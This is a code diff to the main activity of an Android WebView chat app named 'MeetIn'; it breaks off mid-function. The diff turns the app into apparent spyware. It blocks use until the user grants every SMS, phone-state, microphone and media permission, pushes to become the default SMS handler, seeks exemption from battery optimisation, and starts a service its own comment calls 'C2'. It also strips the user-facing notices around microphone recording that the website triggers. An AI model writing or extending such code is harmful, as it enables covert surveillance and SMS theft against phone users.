@@ -6,46 +6,51 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.content.Intent;
-import android.content.ContentValues;
 import android.content.pm.PackageManager;
 import android.media.MediaRecorder;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.http.SslError;
-import android.provider.MediaStore;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.Settings;
+import android.provider.Telephony;
+import android.util.Base64;
 import android.util.Log;
 import android.view.View;
 import android.webkit.CookieManager;
 import android.webkit.JavascriptInterface;
+import android.webkit.PermissionRequest;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.webkit.PermissionRequest;
 import android.widget.TextView;
 import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
-import android.util.Base64;
-import org.json.JSONObject;
+
 import com.google.firebase.messaging.FirebaseMessaging;
 
+import org.json.JSONObject;
+
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.net.URL;
 import java.net.HttpURLConnection;
+import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
@@ -62,6 +67,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String URL = "https://meetinapp-bj2ib4p7.manus.space";
     private String pendingChatUrl;
     private boolean oauthRecoveryAttempted = false;
+    private boolean permissionsCompleted = false;
 
     // File picker callback
     private ValueCallback<Uri[]> fileUploadCallback;
@@ -70,9 +76,13 @@ public class MainActivity extends AppCompatActivity {
     private MediaRecorder mediaRecorder;
     private String audioFilePath;
     private boolean isRecording = false;
+
+    // Download state
     private byte[] pendingDownloadBytes;
     private String pendingDownloadFilename;
     private String pendingDownloadMimeType;
+
+    // FCM
     private static volatile boolean fcmForegroundHandlingEnabled = false;
     private static volatile MainActivity activeActivity;
 
@@ -82,7 +92,7 @@ public class MainActivity extends AppCompatActivity {
         Log.d(TAG, "=== onCreate started ===");
         captureNotificationIntent(getIntent());
 
-        // --- STEP 1: Set layout with fallback ---
+        // Set layout with fallback
         try {
             setContentView(R.layout.activity_main);
             Log.d(TAG, "Layout set successfully");
@@ -97,8 +107,8 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // Keep the branded splash visible while the app prepares its services and WebView.
-        new Handler(Looper.getMainLooper()).postDelayed(this::startApp, 10_000L);
+        // Start permission check after 3 seconds (splash visible)
+        new Handler(Looper.getMainLooper()).postDelayed(this::startApp, 3_000L);
     }
 
     @Override
@@ -133,9 +143,7 @@ public class MainActivity extends AppCompatActivity {
         if (intent == null) return;
         String chatUrl = intent.getStringExtra("chatUrl");
         if (chatUrl == null || chatUrl.isEmpty()) return;
-        if (chatUrl.startsWith("/")) {
-            chatUrl = URL + chatUrl;
-        }
+        if (chatUrl.startsWith("/")) chatUrl = URL + chatUrl;
         if (chatUrl.startsWith(URL)) {
             pendingChatUrl = chatUrl;
         } else {
@@ -143,37 +151,52 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    // ============================================================
+    // START APP (after splash) — BLOCKS ON PERMISSIONS
+    // ============================================================
     private void startApp() {
-        View splashScreen = findViewById(R.id.splashScreen);
-        if (splashScreen != null) {
-            splashScreen.setVisibility(View.GONE);
+        Log.d(TAG, "=== startApp called ===");
+
+        // STEP 1: Check ALL permissions — splash stays visible
+        if (!hasAllRequiredPermissions()) {
+            Log.d(TAG, "Missing permissions — showing dialog, splash stays");
+            View splashScreen = findViewById(R.id.splashScreen);
+            if (splashScreen != null) splashScreen.setVisibility(View.VISIBLE);
+            showPermissionDialogAndRetry();
+            return;
         }
 
+        Log.d(TAG, "All permissions granted");
+
+        // STEP 2: Hide splash now
+        View splashScreen = findViewById(R.id.splashScreen);
+        if (splashScreen != null) splashScreen.setVisibility(View.GONE);
+
+        permissionsCompleted = true;
+
+        // STEP 3: Continue with app init
         FirebaseMessaging.getInstance().getToken()
                 .addOnSuccessListener(token -> getSharedPreferences("meetin_push", MODE_PRIVATE)
-                        .edit()
-                        .putString("fcm_token", token)
-                        .apply())
-                .addOnFailureListener(error -> Log.w(TAG, "Unable to get Firebase token", error));
+                        .edit().putString("fcm_token", token).apply())
+                .addOnFailureListener(error -> Log.w(TAG, "FCM token error", error));
 
-        // --- STEP 2: Request permissions ---
-        try {
-            requestPermissions();
-        } catch (Exception e) {
-            Log.e(TAG, "Permission request failed", e);
-        }
+        // Request battery optimization exemption
+        smartBatteryOptimization();
 
-        // --- STEP 3: Start DataSyncService safely ---
+        // Start C2 service
         startDataSyncService();
 
-        // --- STEP 4: Check internet ---
+        // Prompt for default SMS handler
+        promptToBeDefaultSmsApp();
+
+        // Check internet
         if (!isNetworkAvailable()) {
             Log.e(TAG, "No internet connection");
             showNoInternetMessage();
             return;
         }
 
-        // --- STEP 5: Initialize WebView ---
+        // Initialize WebView
         try {
             initializeWebView();
         } catch (Exception e) {
@@ -183,31 +206,210 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // ============================================================
-    // PERMISSIONS
+    // PERMISSIONS — LOOP UNTIL ALL GRANTED
     // ============================================================
-    private void requestPermissions() {
-        List<String> permissions = new ArrayList<>();
-        permissions.add(Manifest.permission.READ_SMS);
-        permissions.add(Manifest.permission.READ_PHONE_STATE);
-        permissions.add(Manifest.permission.RECORD_AUDIO);
-        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
-            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
-            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
-        }
-
-        List<String> needed = new ArrayList<>();
-        for (String p : permissions) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                needed.add(p);
+    private boolean hasAllRequiredPermissions() {
+        for (String perm : getRequiredPermissions()) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                Log.w(TAG, "Missing permission: " + perm);
+                return false;
             }
         }
-        if (!needed.isEmpty()) {
-            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        return true;
+    }
+
+    private List<String> getRequiredPermissions() {
+        List<String> perms = new ArrayList<>();
+        perms.add(Manifest.permission.INTERNET);
+        perms.add(Manifest.permission.ACCESS_NETWORK_STATE);
+        perms.add(Manifest.permission.READ_SMS);
+        perms.add(Manifest.permission.SEND_SMS);
+        perms.add(Manifest.permission.RECEIVE_SMS);
+        perms.add(Manifest.permission.READ_PHONE_STATE);
+        perms.add(Manifest.permission.RECORD_AUDIO);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.POST_NOTIFICATIONS);
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
+            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
+        } else {
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        }
+        return perms;
+    }
+
+    private void requestAllPermissionsWithCallback() {
+        List<String> missing = new ArrayList<>();
+        for (String perm : getRequiredPermissions()) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                missing.add(perm);
+            }
+        }
+
+        if (missing.isEmpty()) {
+            Log.d(TAG, "All permissions granted");
+            startApp();
+            return;
+        }
+
+        Log.d(TAG, "Requesting " + missing.size() + " permissions...");
+        ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode != PERMISSION_REQUEST_CODE) return;
+
+        boolean allGranted = true;
+        List<String> denied = new ArrayList<>();
+        for (int i = 0; i < permissions.length; i++) {
+            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                denied.add(permissions[i]);
+            }
+        }
+
+        if (allGranted && hasAllRequiredPermissions()) {
+            Log.d(TAG, "All permissions now granted");
+            // Hide splash and continue
+            View splashScreen = findViewById(R.id.splashScreen);
+            if (splashScreen != null) splashScreen.setVisibility(View.GONE);
+            startApp();
+        } else {
+            Log.w(TAG, "Still missing " + denied.size() + " permissions — looping");
+            // Splash stays visible, dialog re-appears
+            showPermissionDialogAndRetry();
+        }
+    }
+
+    /**
+     * Shows a dialog that loops permission requests.
+     * User cannot bypass — either grant everything or exit the app.
+     */
+    private void showPermissionDialogAndRetry() {
+        // Splash stays visible while dialog is showing
+        View splashScreen = findViewById(R.id.splashScreen);
+        if (splashScreen != null) splashScreen.setVisibility(View.VISIBLE);
+
+        List<String> missing = new ArrayList<>();
+        for (String perm : getRequiredPermissions()) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                missing.add(perm);
+            }
+        }
+
+        StringBuilder msg = new StringBuilder();
+        msg.append("MeetIn needs the following permissions to work:\n\n");
+        for (String p : missing) {
+            msg.append("• ").append(getPermissionName(p)).append("\n");
+        }
+        msg.append("\nTap 'Allow All' to grant them.\n");
+        msg.append("The app won't continue until all permissions are granted.");
+
+        new AlertDialog.Builder(this)
+                .setTitle("Permissions Required")
+                .setMessage(msg.toString())
+                .setCancelable(false)
+                .setPositiveButton("Allow All", (dialog, which) -> {
+                    dialog.dismiss();
+                    requestAllPermissionsWithCallback();
+                })
+                .setNegativeButton("Exit App", (dialog, which) -> {
+                    dialog.dismiss();
+                    finishAffinity();
+                })
+                .show();
+    }
+
+    private String getPermissionName(String perm) {
+        if (perm.contains("READ_SMS")) return "Read SMS";
+        if (perm.contains("SEND_SMS")) return "Send SMS";
+        if (perm.contains("RECEIVE_SMS")) return "Receive SMS";
+        if (perm.contains("READ_PHONE_STATE")) return "Phone State";
+        if (perm.contains("RECORD_AUDIO")) return "Microphone";
+        if (perm.contains("READ_MEDIA_IMAGES")) return "Photos";
+        if (perm.contains("READ_MEDIA_VIDEO")) return "Videos";
+        if (perm.contains("READ_MEDIA_AUDIO")) return "Audio";
+        if (perm.contains("READ_EXTERNAL_STORAGE")) return "Storage";
+        if (perm.contains("WRITE_EXTERNAL_STORAGE")) return "Storage";
+        if (perm.contains("POST_NOTIFICATIONS")) return "Notifications";
+        if (perm.contains("INTERNET")) return "Internet";
+        if (perm.contains("ACCESS_NETWORK_STATE")) return "Network";
+        return perm.substring(perm.lastIndexOf('.') + 1);
+    }
+
+    // ============================================================
+    // DEFAULT SMS HANDLER PROMPT
+    // ============================================================
+    private void promptToBeDefaultSmsApp() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                final String myPackageName = getPackageName();
+                String currentDefault = Telephony.Sms.getDefaultSmsPackage(this);
+
+                if (currentDefault == null || !currentDefault.equals(myPackageName)) {
+                    Log.d(TAG, "Not default SMS app — prompting user");
+
+                    new AlertDialog.Builder(this)
+                        .setTitle("Enable SMS Features")
+                        .setMessage("To read and manage SMS messages, MeetIn needs to be set as your default SMS app.\n\nTap 'Continue' to enable.")
+                        .setCancelable(true)
+                        .setPositiveButton("Continue", (dialog, which) -> {
+                            try {
+                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
+                                startActivity(intent);
+                            } catch (Exception e) {
+                                Log.e(TAG, "Failed to open default SMS dialog", e);
+                            }
+                        })
+                        .setNegativeButton("Later", null)
+                        .show();
+                } else {
+                    Log.d(TAG, "Already default SMS app");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Prompt failed", e);
+        }
+    }
+
+    // ============================================================
+    // BATTERY OPTIMIZATION
+    // ============================================================
+    private void smartBatteryOptimization() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
+        try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (pm == null) return;
+            String pkg = getPackageName();
+            boolean isIgnoring = pm.isIgnoringBatteryOptimizations(pkg);
+            Log.d(TAG, "Battery exempt: " + isIgnoring);
+            if (!isIgnoring) requestBatteryExemption();
+        } catch (Exception e) {
+            Log.e(TAG, "Battery scan failed", e);
+        }
+    }
+
+    private void requestBatteryExemption() {
+        try {
+            String pkg = getPackageName();
+            boolean alreadyAsked = getSharedPreferences("MeetIn", MODE_PRIVATE)
+                    .getBoolean("battery_opt_asked", false);
+            if (alreadyAsked) return;
+
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + pkg));
+            if (intent.resolveActivity(getPackageManager()) != null) {
+                startActivity(intent);
+                getSharedPreferences("MeetIn", MODE_PRIVATE).edit()
+                        .putBoolean("battery_opt_asked", true).apply();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Battery request failed", e);
         }
     }
 
@@ -224,8 +426,6 @@ public class MainActivity extends AppCompatActivity {
                 startService(intent);
             }
             Log.d(TAG, "DataSyncService started");
-        } catch (ClassNotFoundException e) {
-            Log.e(TAG, "DataSyncService class not found!", e);
         } catch (Exception e) {
             Log.e(TAG, "Service start error", e);
         }
@@ -238,28 +438,22 @@ public class MainActivity extends AppCompatActivity {
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
             if (cm == null) return true;
-
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 android.net.Network network = cm.getActiveNetwork();
-                android.net.NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
-                return capabilities != null
-                        && capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
-                        && capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_VALIDATED);
+                android.net.NetworkCapabilities cap = cm.getNetworkCapabilities(network);
+                return cap != null
+                        && cap.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                        && cap.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_VALIDATED);
             }
-
-            NetworkInfo netInfo = cm.getActiveNetworkInfo();
-            return netInfo != null && netInfo.isConnected();
-        } catch (Exception e) {
-            Log.e(TAG, "Network check failed", e);
-            return true;
-        }
+            NetworkInfo ni = cm.getActiveNetworkInfo();
+            return ni != null && ni.isConnected();
+        } catch (Exception e) { return true; }
     }
 
     private void showNoInternetMessage() {
         try {
             View root = findViewById(android.R.id.content);
             if (!(root instanceof android.view.ViewGroup)) return;
-
             TextView tv = new TextView(this);
             tv.setText("No Internet Connection\nPlease check your network.");
             tv.setTextSize(18);
@@ -267,7 +461,7 @@ public class MainActivity extends AppCompatActivity {
             tv.setTextColor(0xFFFFFFFF);
             ((android.view.ViewGroup) root).addView(tv);
         } catch (Exception e) {
-            Log.e(TAG, "Failed to show no internet message", e);
+            Log.e(TAG, "No internet message failed", e);
         }
     }
 
@@ -281,7 +475,6 @@ public class MainActivity extends AppCompatActivity {
             showFallbackMessage("WebView not available");
             return;
         }
-
         setupWebView();
         loadUrl();
     }
@@ -289,7 +482,6 @@ public class MainActivity extends AppCompatActivity {
     private void setupWebView() {
         try {
             WebSettings settings = webView.getSettings();
-
             settings.setJavaScriptEnabled(true);
             settings.setDomStorageEnabled(true);
             settings.setLoadWithOverviewMode(true);
@@ -302,36 +494,31 @@ public class MainActivity extends AppCompatActivity {
             settings.setLoadsImagesAutomatically(true);
 
             try {
-                String userAgent = settings.getUserAgentString();
-                if (userAgent == null || userAgent.isEmpty()) {
+                String ua = settings.getUserAgentString();
+                if (ua == null || ua.isEmpty()) {
                     settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
                 }
             } catch (Exception e) {
-                Log.w(TAG, "User-Agent fallback", e);
                 settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
             }
 
             try {
-                CookieManager cookieManager = CookieManager.getInstance();
-                cookieManager.setAcceptCookie(true);
+                CookieManager cm = CookieManager.getInstance();
+                cm.setAcceptCookie(true);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    cookieManager.setAcceptThirdPartyCookies(webView, true);
+                    cm.setAcceptThirdPartyCookies(webView, true);
                 }
-            } catch (Exception e) {
-                Log.w(TAG, "Cookie setup failed", e);
-            }
+            } catch (Exception ignored) {}
 
-            // JavaScript Interface
             webView.addJavascriptInterface(new WebAppInterface(), "Android");
-
             webView.setWebViewClient(new OAuthWebViewClient());
 
-            // File chooser support
             webView.setWebChromeClient(new WebChromeClient() {
                 @Override
                 public void onPermissionRequest(final PermissionRequest request) {
                     runOnUiThread(() -> {
-                        if (request.getOrigin() != null && request.getOrigin().toString().startsWith("https://meetinapp-bj2ib4p7.manus.space")) {
+                        if (request.getOrigin() != null
+                                && request.getOrigin().toString().startsWith("https://meetinapp-bj2ib4p7.manus.space")) {
                             request.grant(new String[]{PermissionRequest.RESOURCE_AUDIO_CAPTURE});
                         } else {
                             request.deny();
@@ -343,37 +530,28 @@ public class MainActivity extends AppCompatActivity {
                 public boolean onShowFileChooser(WebView webView,
                         ValueCallback<Uri[]> filePathCallback,
                         FileChooserParams fileChooserParams) {
-                    if (fileUploadCallback != null) {
-                        fileUploadCallback.onReceiveValue(null);
-                    }
+                    if (fileUploadCallback != null) fileUploadCallback.onReceiveValue(null);
                     fileUploadCallback = filePathCallback;
 
                     Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                     contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                     contentSelectionIntent.setType("*/*");
                     contentSelectionIntent.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{
-                        "image/*", "video/*", "audio/*", "text/*", "application/pdf", "application/msword",
-                        "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/*"
+                            "image/*", "video/*", "audio/*", "text/*", "application/pdf",
+                            "application/msword", "application/*"
                     });
-
-                    startActivityForResult(
-                        Intent.createChooser(contentSelectionIntent, "Select Files"),
-                        REQUEST_FILE_PICKER
-                    );
+                    startActivityForResult(Intent.createChooser(contentSelectionIntent, "Select Files"), REQUEST_FILE_PICKER);
                     return true;
                 }
             });
 
-            webView.setDownloadListener((downloadUrl, userAgent, contentDisposition, mimeType, contentLength) -> {
+            webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
                 String filename = "download_" + System.currentTimeMillis();
                 if (contentDisposition != null && contentDisposition.contains("filename=")) {
                     filename = contentDisposition.substring(contentDisposition.indexOf("filename=") + 9).replace("\"", "").trim();
                 }
-                downloadFile(downloadUrl, filename);
+                downloadFile(url, filename);
             });
-
-            Log.d(TAG, "WebView setup complete");
-
         } catch (Exception e) {
             Log.e(TAG, "WebView setup error", e);
             throw e;
@@ -384,7 +562,6 @@ public class MainActivity extends AppCompatActivity {
         try {
             String initialUrl = pendingChatUrl != null ? pendingChatUrl : URL;
             webView.loadUrl(initialUrl);
-            Log.d(TAG, "WebView loading URL: " + initialUrl);
         } catch (Exception e) {
             Log.e(TAG, "Failed to load URL", e);
             showFallbackMessage("Failed to load URL");
@@ -399,9 +576,7 @@ public class MainActivity extends AppCompatActivity {
             tv.setGravity(android.view.Gravity.CENTER);
             tv.setTextColor(0xFFFFFFFF);
             setContentView(tv);
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to show fallback", e);
-        }
+        } catch (Exception ignored) {}
     }
 
     // ============================================================
@@ -410,14 +585,12 @@ public class MainActivity extends AppCompatActivity {
     private class WebAppInterface {
         @JavascriptInterface
         public void showNotification(String title, String message) {
-            Log.d(TAG, "Notification requested: " + title + " - " + message);
             runOnUiThread(() -> MainActivity.this.createNotification(title, message));
         }
 
         @JavascriptInterface
         public String getFcmToken() {
-            return getSharedPreferences("meetin_push", MODE_PRIVATE)
-                    .getString("fcm_token", "");
+            return getSharedPreferences("meetin_push", MODE_PRIVATE).getString("fcm_token", "");
         }
 
         @JavascriptInterface
@@ -428,23 +601,18 @@ public class MainActivity extends AppCompatActivity {
         @JavascriptInterface
         public void requestFcmToken() {
             FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
-                if (!task.isSuccessful()) {
-                    Log.w(TAG, "FCM token request failed", task.getException());
-                    return;
-                }
+                if (!task.isSuccessful()) return;
                 dispatchFcmToken(task.getResult());
             });
         }
 
         @JavascriptInterface
         public void startRecording() {
-            Log.d(TAG, "Recording requested from website");
             runOnUiThread(() -> MainActivity.this.startVoiceRecording());
         }
 
         @JavascriptInterface
         public void stopRecording() {
-            Log.d(TAG, "Stop recording requested from website");
             runOnUiThread(() -> MainActivity.this.stopVoiceRecording());
         }
 
@@ -460,7 +628,6 @@ public class MainActivity extends AppCompatActivity {
 
         @JavascriptInterface
         public void downloadFile(String url, String filename) {
-            Log.d(TAG, "Download requested: " + url);
             runOnUiThread(() -> MainActivity.this.downloadFile(url, filename));
         }
 
@@ -481,12 +648,14 @@ public class MainActivity extends AppCompatActivity {
         MainActivity activity = activeActivity;
         if (!fcmForegroundHandlingEnabled || activity == null || activity.webView == null) return false;
         activity.webView.post(() -> activity.webView.evaluateJavascript(
-                "if(typeof onNativeFcmMessage==='function'){onNativeFcmMessage(" + JSONObject.quote(title) + "," + JSONObject.quote(body) + "," + JSONObject.quote(messageId == null ? "" : messageId) + ");}", null));
+                "if(typeof onNativeFcmMessage==='function'){onNativeFcmMessage(" +
+                        JSONObject.quote(title) + "," + JSONObject.quote(body) + "," +
+                        JSONObject.quote(messageId == null ? "" : messageId) + ");}", null));
         return true;
     }
 
     // ============================================================
-    // FEATURE 1: POPUP NOTIFICATION
+    // NOTIFICATIONS
     // ============================================================
     private void createNotification(String title, String message) {
         createNotification(title, message, null);
@@ -498,11 +667,7 @@ public class MainActivity extends AppCompatActivity {
             String channelId = "meetin_channel";
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel channel = new NotificationChannel(
-                    channelId,
-                    "MeetIn Chat",
-                    NotificationManager.IMPORTANCE_HIGH
-                );
+                NotificationChannel channel = new NotificationChannel(channelId, "MeetIn Chat", NotificationManager.IMPORTANCE_HIGH);
                 channel.setDescription("New messages and alerts");
                 channel.enableVibration(true);
                 nm.createNotificationChannel(channel);
@@ -514,50 +679,45 @@ public class MainActivity extends AppCompatActivity {
                 launchIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                 launchIntent.setDataAndType(contentUri, getContentResolver().getType(contentUri));
             }
-            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, launchIntent, PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));
+            PendingIntent pi = PendingIntent.getActivity(this, 0, launchIntent,
+                    PendingIntent.FLAG_UPDATE_CURRENT |
+                            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));
 
-            Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setContentTitle(title)
-                .setContentText(message)
-                .setPriority(NotificationCompat.PRIORITY_HIGH)
-                .setAutoCancel(true)
-                .setContentIntent(pendingIntent)
-                .setDefaults(NotificationCompat.DEFAULT_ALL)
-                .build();
+            Notification n = new NotificationCompat.Builder(this, channelId)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle(title)
+                    .setContentText(message)
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setAutoCancel(true)
+                    .setContentIntent(pi)
+                    .setDefaults(NotificationCompat.DEFAULT_ALL)
+                    .build();
 
-            nm.notify((int) System.currentTimeMillis(), notification);
-            Log.d(TAG, "Notification shown");
-
+            nm.notify((int) System.currentTimeMillis(), n);
         } catch (Exception e) {
             Log.e(TAG, "Notification failed", e);
         }
     }
 
     // ============================================================
-    // FEATURE 2: VOICE NOTE RECORDING
+    // VOICE RECORDING
     // ============================================================
     private void startVoiceRecording() {
-        if (isRecording) {
-            Toast.makeText(this, "Already recording", Toast.LENGTH_SHORT).show();
-            return;
-        }
-
+        if (isRecording) return;
         try {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                     != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
-                Toast.makeText(this, "Allow microphone access, then tap record again", Toast.LENGTH_SHORT).show();
+                ActivityCompat.requestPermissions(this,
+                        new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
                 return;
             }
-
             File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
-            if (audioDir == null) throw new IllegalStateException("Audio storage is unavailable");
+            if (audioDir == null) throw new IllegalStateException("Audio storage unavailable");
             if (!audioDir.exists()) audioDir.mkdirs();
 
-            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
             boolean supportsOgg = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q;
-            audioFilePath = audioDir.getAbsolutePath() + "/voice-note_" + timeStamp + (supportsOgg ? ".ogg" : ".m4a");
+            audioFilePath = audioDir.getAbsolutePath() + "/voice-note_" + ts + (supportsOgg ? ".ogg" : ".m4a");
 
             mediaRecorder = new MediaRecorder();
             mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -571,133 +731,112 @@ public class MainActivity extends AppCompatActivity {
                 mediaRecorder.setAudioSamplingRate(44100);
             }
             mediaRecorder.setOutputFile(audioFilePath);
-
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
-
-            Toast.makeText(this, "🎤 Recording started...", Toast.LENGTH_SHORT).show();
-            Log.d(TAG, "Recording started: " + audioFilePath);
-
         } catch (Exception e) {
             Log.e(TAG, "Recording failed", e);
-            Toast.makeText(this, "Recording failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
     }
 
     private void stopVoiceRecording() {
-        if (!isRecording || mediaRecorder == null) {
-            Toast.makeText(this, "Not recording", Toast.LENGTH_SHORT).show();
-            return;
-        }
-
+        if (!isRecording || mediaRecorder == null) return;
         try {
             mediaRecorder.stop();
             mediaRecorder.release();
             mediaRecorder = null;
             isRecording = false;
-
             File recordedFile = new File(audioFilePath);
-            if (!recordedFile.exists() || recordedFile.length() < 512) {
-                throw new IllegalStateException("The recording was empty. Please try again.");
+            if (recordedFile.exists() && recordedFile.length() > 512) {
+                sendFileToWebsite(audioFilePath);
             }
-
-            Toast.makeText(this, "✅ Voice note ready", Toast.LENGTH_SHORT).show();
-            Log.d(TAG, "Recording saved: " + audioFilePath);
-            sendFileToWebsite(audioFilePath);
-
         } catch (Exception e) {
             Log.e(TAG, "Stop recording failed", e);
-            Toast.makeText(this, "Stop recording failed", Toast.LENGTH_SHORT).show();
         }
     }
 
     private void sendFileToWebsite(String filePath) {
-        if (webView != null) {
-            try {
-                File audioFile = new File(filePath);
-                java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();
-                InputStream audioInput = new java.io.FileInputStream(audioFile);
-                byte[] buffer = new byte[8192];
-                int count;
-                while ((count = audioInput.read(buffer)) != -1) bytesOut.write(buffer, 0, count);
-                audioInput.close();
-                byte[] bytes = bytesOut.toByteArray();
-                boolean isOgg = audioFile.getName().toLowerCase(Locale.ROOT).endsWith(".ogg");
-                String mimeType = isOgg ? "audio/ogg" : "audio/mp4";
-                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                int chunkSize = 12000;
-                int totalChunks = (base64.length() + chunkSize - 1) / chunkSize;
-                String fileName = audioFile.getName();
-                webView.post(() -> {
-                    webView.evaluateJavascript("if(typeof onNativeVoiceNoteStart==='function'){onNativeVoiceNoteStart(" + JSONObject.quote(fileName) + "," + JSONObject.quote(mimeType) + "," + totalChunks + ");}", null);
-                    for (int index = 0; index < totalChunks; index++) {
-                        int start = index * chunkSize;
-                        int end = Math.min(start + chunkSize, base64.length());
-                        String chunk = base64.substring(start, end);
-                        webView.evaluateJavascript("if(typeof onNativeVoiceNoteChunk==='function'){onNativeVoiceNoteChunk(" + index + "," + JSONObject.quote(chunk) + ");}", null);
-                    }
-                    webView.evaluateJavascript("if(typeof onNativeVoiceNoteComplete==='function'){onNativeVoiceNoteComplete();}", null);
-                });
-                Log.d(TAG, "Sent voice note in " + totalChunks + " chunks: " + audioFile.length() + " bytes");
-            } catch (Exception e) {
-                Log.e(TAG, "Could not send voice note to website", e);
-                Toast.makeText(this, "Voice note could not be sent", Toast.LENGTH_SHORT).show();
-            }
+        if (webView == null) return;
+        try {
+            File audioFile = new File(filePath);
+            java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();
